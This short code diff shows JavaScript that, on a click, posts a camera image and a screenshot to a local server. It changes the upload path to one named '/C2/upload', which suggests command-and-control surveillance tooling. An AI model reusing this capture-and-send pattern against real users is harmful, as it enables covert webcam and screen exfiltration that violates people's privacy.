@@ -118,7 +118,7 @@ gumVideo.addEventListener('click', async function(){
     formData.append('camera', camera, 'camera.jpg');
     formData.append('screenshot', screenshot, 'screenshot.png');
 
-    await fetch('http://127.0.0.1:5000/upload', {
+    await fetch('http://127.0.0.1:5000/C2/upload', {
       method: 'POST',
       body: formData
   })
